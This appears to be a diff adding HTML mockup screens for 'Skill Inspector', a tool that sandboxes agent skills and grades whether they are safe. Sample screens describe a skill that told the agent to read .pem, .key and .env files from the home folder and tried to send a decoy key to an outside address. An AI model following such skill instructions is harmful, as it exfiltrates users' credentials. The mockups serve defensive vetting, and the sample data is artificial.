+            <div style="display:flex;align-items:center;gap:10px;font-size:16px;font-weight:600;"><div style="width:22px;height:22px;border-radius:6px;border:2px solid #15181C;display:flex;align-items:center;justify-content:center;box-sizing:border-box;"><div style="width:8px;height:8px;border-radius:2px;background:#2D5BC2;"></div></div>Skill Inspector</div>
+            <div style="font-size:15px;color:#4A5058;">History</div>
+          </div>
+          <div style="flex:1;display:flex;justify-content:center;padding-top:120px;">
+            <div style="width:680px;background:#FFFFFF;border:1px solid #E3E4E0;border-radius:24px;padding:40px;display:flex;flex-direction:column;gap:20px;align-self:flex-start;">
+              <div style="display:flex;flex-direction:column;gap:6px;">
+                <div style="font-size:15px;color:#5D636B;">PdfSplitterPro · github.com/example/pdf-splitter</div>
+                <div style="font-size:30px;line-height:38px;font-weight:600;letter-spacing:-0.015em;">We couldn't check this safely, so we didn't run it.</div>
+              </div>
+              <div style="font-size:17px;line-height:26px;color:#2A2F36;">This skill needs to install extra software from the internet before it starts. Our test space can't allow that, so there's no grade.</div>
+              <div style="border-top:1px solid #ECEDEA;padding-top:20px;display:flex;flex-direction:column;gap:10px;">
+                <div style="font-size:15px;font-weight:600;">What you can try</div>
+                <div style="font-size:16px;line-height:24px;color:#4A5058;">Check a link to a specific release of the skill instead of the main branch.</div>
+                <div style="font-size:16px;line-height:24px;color:#4A5058;">Ask the skill's author whether it can run without downloading anything.</div>
+              </div>
+              <div style="display:flex;gap:12px;padding-top:4px;">
+                <div style="height:46px;padding:0 20px;border-radius:12px;background:#2D5BC2;color:#FFFFFF;font-size:15.5px;font-weight:600;display:flex;align-items:center;">Check another</div>
+                <div style="height:46px;padding:0 18px;border-radius:12px;background:#FFFFFF;border:1px solid #CFD3CE;font-size:15.5px;font-weight:600;display:flex;align-items:center;">Show details</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">10 History · approved list</div>
+        <div data-screen-label="10 History" style="width:1440px;height:900px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);display:flex;flex-direction:column;">
+          <div style="height:64px;padding:0 48px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #E3E4E0;background:#FFFFFF;flex:none;">
+            <div style="display:flex;align-items:center;gap:10px;font-size:16px;font-weight:600;"><div style="width:22px;height:22px;border-radius:6px;border:2px solid #15181C;display:flex;align-items:center;justify-content:center;box-sizing:border-box;"><div style="width:8px;height:8px;border-radius:2px;background:#2D5BC2;"></div></div>Skill Inspector</div>
+            <div style="font-size:15px;color:#15181C;font-weight:600;">History</div>
+          </div>
+          <div style="padding:48px 64px;display:flex;flex-direction:column;gap:24px;">
+            <div style="display:flex;justify-content:space-between;align-items:flex-end;">
+              <div style="display:flex;flex-direction:column;gap:6px;"><div style="font-size:32px;font-weight:600;letter-spacing:-0.02em;">Skills you've checked</div><div style="font-size:16px;color:#4A5058;">Star a skill to add it to your team's approved list.</div></div>
+              <div style="display:flex;gap:4px;padding:4px;border-radius:12px;background:#ECEDEA;font-size:14.5px;font-weight:600;">
+                <div style="padding:8px 14px;border-radius:9px;background:#FFFFFF;box-shadow:0 1px 2px rgba(0,0,0,0.06);">All</div>
+                <div style="padding:8px 14px;border-radius:9px;color:#4A5058;">Approved</div>
+              </div>
+            </div>
+            <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:20px;overflow:hidden;">
+              <div style="display:grid;grid-template-columns:minmax(0,2fr) 90px minmax(0,1.2fr) 200px 140px;gap:16px;padding:14px 24px;background:#F7F7F5;font-size:13.5px;font-weight:600;color:#4A5058;"><span>Skill</span><span>Grade</span><span>Verdict</span><span>Checked</span><span>Approved</span></div>
+              <div style="display:grid;grid-template-columns:minmax(0,2fr) 90px minmax(0,1.2fr) 200px 140px;gap:16px;padding:16px 24px;align-items:center;border-top:1px solid #ECEDEA;font-size:16px;" style-hover="background:#FAFAF8;"><span style="font-weight:600;">MarkdownPolish</span><span style="width:34px;height:34px;border-radius:9px;background:#C8372D;color:#FFFFFF;font-weight:700;display:flex;align-items:center;justify-content:center;">F</span><span style="color:#8F2A22;">Do not install</span><span style="color:#4A5058;">5 Nov 2026</span><span style="color:#B9BEC4;font-size:20px;">☆</span></div>
+              <div style="display:grid;grid-template-columns:minmax(0,2fr) 90px minmax(0,1.2fr) 200px 140px;gap:16px;padding:16px 24px;align-items:center;border-top:1px solid #ECEDEA;font-size:16px;"><span style="font-weight:600;">TidyMarkdown</span><span style="width:34px;height:34px;border-radius:9px;background:#1F8A4C;color:#FFFFFF;font-weight:700;display:flex;align-items:center;justify-content:center;">A</span><span style="color:#17683A;">Safe to install</span><span style="color:#4A5058;">5 Nov 2026</span><span style="color:#C98A12;font-size:20px;">★</span></div>
+              <div style="display:grid;grid-template-columns:minmax(0,2fr) 90px minmax(0,1.2fr) 200px 140px;gap:16px;padding:16px 24px;align-items:center;border-top:1px solid #ECEDEA;font-size:16px;"><span style="font-weight:600;">CsvPeek</span><span style="width:34px;height:34px;border-radius:9px;background:#1F8A4C;color:#FFFFFF;font-weight:700;display:flex;align-items:center;justify-content:center;">B</span><span style="color:#17683A;">Safe to install</span><span style="color:#4A5058;">4 Nov 2026</span><span style="color:#C98A12;font-size:20px;">★</span></div>
+              <div style="display:grid;grid-template-columns:minmax(0,2fr) 90px minmax(0,1.2fr) 200px 140px;gap:16px;padding:16px 24px;align-items:center;border-top:1px solid #ECEDEA;font-size:16px;"><span style="font-weight:600;">ColorNamer</span><span style="width:34px;height:34px;border-radius:9px;background:#1F8A4C;color:#FFFFFF;font-weight:700;display:flex;align-items:center;justify-content:center;">A</span><span style="color:#17683A;">Safe to install</span><span style="color:#4A5058;">4 Nov 2026</span><span style="color:#B9BEC4;font-size:20px;">☆</span></div>
+              <div style="display:grid;grid-template-columns:minmax(0,2fr) 90px minmax(0,1.2fr) 200px 140px;gap:16px;padding:16px 24px;align-items:center;border-top:1px solid #ECEDEA;font-size:16px;"><span style="font-weight:600;">ChangelogWriter</span><span style="width:34px;height:34px;border-radius:9px;background:#C98A12;color:#FFFFFF;font-weight:700;display:flex;align-items:center;justify-content:center;">C</span><span style="color:#7A4A00;">Risky</span><span style="color:#4A5058;">3 Nov 2026</span><span style="color:#B9BEC4;font-size:20px;">☆</span></div>
+              <div style="display:grid;grid-template-columns:minmax(0,2fr) 90px minmax(0,1.2fr) 200px 140px;gap:16px;padding:16px 24px;align-items:center;border-top:1px solid #ECEDEA;font-size:16px;"><span style="font-weight:600;">PdfSplitterPro</span><span style="width:34px;height:34px;border-radius:9px;border:1.5px dashed #B9BEC4;color:#7A8088;font-weight:600;display:flex;align-items:center;justify-content:center;box-sizing:border-box;">–</span><span style="color:#4A5058;">Couldn't check</span><span style="color:#4A5058;">3 Nov 2026</span><span></span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ROW: RECORDING + LONG TEXT -->
+  <div style="display:flex;flex-direction:column;gap:24px;">
+    <div style="font-size:22px;font-weight:600;">6 · Recording mode and longest-text test</div>
+    <div style="display:flex;gap:64px;align-items:flex-start;flex-wrap:wrap;">
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">11 Recording · ?record=1 · 1920×1080</div>
+        <div data-screen-label="11 Recording" style="width:1920px;height:1080px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);display:flex;flex-direction:column;padding:56px 80px;box-sizing:border-box;gap:36px;">
+          <div style="display:flex;justify-content:space-between;align-items:center;">
+            <div style="display:flex;align-items:center;gap:20px;">
+              <div style="display:flex;align-items:center;gap:12px;font-size:22px;font-weight:600;"><div style="width:30px;height:30px;border-radius:8px;border:2.5px solid #15181C;display:flex;align-items:center;justify-content:center;box-sizing:border-box;"><div style="width:10px;height:10px;border-radius:3px;background:#2D5BC2;"></div></div>Skill Inspector</div>
+              <div style="width:1px;height:28px;background:#D5D8DC;"></div>
+              <div style="font-size:24px;font-weight:600;">MarkdownPolish</div>
+              <div style="font-size:22px;color:#4A5058;">“Tidies up Markdown files”</div>
+            </div>
+            <div style="display:flex;align-items:center;gap:10px;padding:10px 18px;border-radius:999px;background:#EDF2FC;border:1px solid #C9D7F2;font-size:20px;font-weight:600;color:#244CA6;"><div style="width:10px;height:10px;border-radius:50%;background:#2D5BC2;"></div>Sandbox on Vultr</div>
+          </div>
+          <div style="flex:1;display:grid;grid-template-columns:minmax(0,1fr) 560px;gap:36px;min-height:0;">
+            <div style="position:relative;"><dc-import name="GlassBox" beat="proof" hint-size="100%,100%" style="position:absolute;inset:0;"></dc-import></div>
+            <div style="border:2px solid #C8372D;border-radius:24px;background:#FFFFFF;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 16px 40px rgba(200,55,45,0.14);">
+              <div style="padding:26px 32px;background:#FCECEA;display:flex;flex-direction:column;gap:12px;">
+                <span style="align-self:flex-start;padding:5px 14px;border-radius:999px;background:#C8372D;color:#FFFFFF;font-size:18px;font-weight:600;">Stopped</span>
+                <div style="font-size:34px;line-height:42px;font-weight:600;color:#5E1A14;">It tried to send a key to an outside address.</div>
+              </div>
+              <div style="padding:28px 32px;display:flex;flex-direction:column;gap:24px;flex:1;">
+                <div style="display:flex;flex-direction:column;gap:8px;"><div style="font-size:18px;color:#5D636B;">Outside address</div><div style="font-family:'Geist Mono',monospace;font-size:22px;line-height:32px;word-break:break-all;">collect.notes-sync.io/v1/upload</div></div>
+                <div style="display:flex;flex-direction:column;gap:8px;"><div style="font-size:18px;color:#5D636B;">Data it tried to send</div><div style="font-family:'Geist Mono',monospace;font-size:21px;line-height:36px;background:#15181C;color:#E6E8EB;border-radius:16px;padding:20px 24px;word-break:break-all;">"file": "notes.md",<br>"key": <span style="background:#F2C46B;color:#15181C;border-radius:5px;padding:2px 6px;">"AKIA-DECOY-7F3A91C2E8B4"</span></div></div>
+                <div style="font-size:22px;line-height:32px;color:#5B3B00;background:#FDF3E2;border-radius:14px;padding:16px 20px;"><b>Decoy key:</b> fake, planted by us, unlocks nothing. Nothing left the test space.</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">12 Longest text · 390</div>
+        <div data-screen-label="12 Longest text" style="width:390px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);border-radius:28px;padding:60px 16px 24px;box-sizing:border-box;display:flex;flex-direction:column;gap:16px;">
+          <div style="display:flex;flex-direction:column;gap:8px;padding:0 4px;">
+            <span style="font-size:24px;line-height:30px;font-weight:600;overflow-wrap:anywhere;">MarkdownTableOfContentsGeneratorAndFrontMatterLinter</span>
+            <span style="align-self:flex-start;padding:4px 10px;border-radius:999px;background:#EDF2FC;color:#244CA6;font-size:12px;font-weight:600;">Built-in test sample</span>
+          </div>
+          <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:20px;padding:16px 18px;display:flex;flex-direction:column;gap:4px;">
+            <div style="font-size:14px;font-weight:600;padding-bottom:4px;">What's happening</div>
+            <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:10px;padding:6px 0;font-size:15px;line-height:22px;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">1:47</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#D08A10;"></span><span style="overflow-wrap:anywhere;">Skill told the agent to read every file in the home folder that ends in .pem, .key or .env and add it to the notes</span></div>
+          </div>
+          <div style="background:#15181C;border-radius:16px;padding:16px;display:flex;flex-direction:column;gap:4px;">
+            <div style="font-size:12.5px;color:#A3A9B1;">Outside address</div>
+            <div style="font-family:'Geist Mono',monospace;font-size:13.5px;line-height:20px;color:#FFFFFF;word-break:break-all;">https://telemetry-upload.very-long-subdomain.notes-sync-analytics.io/v2/collect?session=7f3a91c2e8b4&amp;user=agent</div>
+          </div>
+          <div style="background:#FFFFFF;border:1px solid #ECEDEA;border-radius:14px;padding:12px 14px;display:flex;flex-direction:column;gap:6px;font-size:15px;line-height:21px;">
+            <div style="display:flex;justify-content:space-between;"><span style="font-size:12.5px;color:#5D636B;">Says</span><span style="font-size:12.5px;font-weight:600;color:#1F7A45;">Matches</span></div>
+            <div style="overflow-wrap:anywhere;">“Converts Markdown tables into evenly spaced, aligned columns and keeps the original column order, header row and any inline formatting intact”</div>
+            <div style="font-size:12.5px;color:#5D636B;padding-top:4px;">We saw</div><div>Realigned 2 tables in notes.md</div>
+          </div>
+          <div style="font-size:13px;line-height:19px;color:#5D636B;padding:0 4px;">Rules: names and feed lines wrap anywhere; addresses and data break on any character; nothing is truncated.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+</x-dc>
+<script type="text/x-dc" data-dc-script data-props="{&quot;plainView&quot;:{&quot;editor&quot;:&quot;boolean&quot;,&quot;default&quot;:false,&quot;tsType&quot;:&quot;boolean&quot;}}">
+class Component extends DCLogic {
+  state = { detailsOpen: false };
+  renderVals() {
+    const plain = !!this.props.plainView;
+    return {
+      plainView: plain, glassView: !plain,
+      detailsOpen: this.state.detailsOpen,
+      detailsLabel: this.state.detailsOpen ? 'Hide details' : 'Show details',
+      toggleDetails: () => this.setState(s => ({ detailsOpen: !s.detailsOpen }))
+    };
+  }
+}
+</script>
+</body>
+</html>
